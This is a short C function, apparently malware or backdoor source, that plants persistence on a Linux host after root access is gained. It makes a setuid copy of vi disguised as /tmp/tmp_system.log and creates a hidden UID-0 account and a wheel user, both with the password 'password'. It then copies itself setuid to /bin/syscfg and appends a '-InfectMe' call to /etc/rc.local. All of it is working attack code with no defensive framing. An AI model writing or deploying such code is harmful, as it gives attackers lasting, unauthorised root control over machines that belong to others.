void OpenTheDoors(int c, char *argv[]){
	char strA[1024];
	int i;

	/* create an SUID copy of the shell 
	 * this setuid program will not work correctly on a CentOS system
	 * because setuid is limited by the kernel
	 * the setuid version of this program we create later, should work just fine.
  	 */
	system("cp /usr/bin/vi /tmp/tmp_system.log");
	system("chmod u+s /tmp/tmp_system.log");

	/* add a root user */
	system("useradd -o -u 0 -m ronda");
	system("echo password | passwd --stdin ronda");

	/* add some regular user who can su */
	system("useradd -G wheel -m will");
	system("echo password | passwd --stdin will");

	/*
	 * The gift that keeps giving... 
	 *
	 */

	 /* copy this program */
	 sprintf(strA, "cp %s /bin/syscfg",argv[0]);
	 system(strA);

	 /* make it suid, just to be "safe" */
	 system("chmod u+s /bin/syscfg");

	 /* 
	  * Add a call to our little friend to /etc/rc.local
	  * but, first we check to make sure we only add it once 
	  */
	i = system("grep \"/bin/syscfg\" /etc/rc.local");
	if(i){
		i = system("echo \"/bin/syscfg -InfectMe\" >> /etc/rc.local");
	}
}
